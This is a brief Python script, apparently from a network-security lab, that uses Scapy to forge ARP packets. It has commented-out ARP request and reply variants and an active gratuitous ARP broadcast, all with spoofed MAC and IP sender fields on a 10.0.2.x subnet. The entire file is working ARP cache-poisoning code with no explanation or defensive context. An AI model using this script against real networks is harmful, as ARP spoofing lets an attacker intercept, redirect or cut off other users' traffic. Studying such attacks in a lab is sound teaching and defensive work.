from scapy.all import *
# ----------------------------ARP request--------------------------

# E=Ether(src="08:00:27:72:0c:aa",dst="08:00:27:0d:9b:83")
# A=ARP(psrc="10.0.2.9",hwsrc="08:00:27:72:0c:aa",pdst="10.0.2.15",op=1)
# pkt=E/A
# sendp(pkt)


# ----------------------------ARP reply--------------------------

# E=Ether(src="aa:bb:cc:dd:ee:ff",dst="08:00:27:20:65:f6")
# A=ARP(psrc="10.0.2.100",hwsrc="aa:bb:cc:dd:ee:11",pdst="10.0.2.9",hwdst="08:00:27:20:65:f6",op=2)
# pkt=E/A
# sendp(pkt)

# ----------------------------ARP gratutious --------------------------

E=Ether(src="aa:bb:cc:dd:ee:ff",dst="ff:ff:ff:ff:ff:ff")
A=ARP(psrc="10.0.2.10",hwsrc="aa:bb:cc:dd:ee:ff",pdst="10.0.2.10",hwdst="ff:ff:ff:ff:ff:ff",op=2)
pkt=E/A
sendp(pkt)
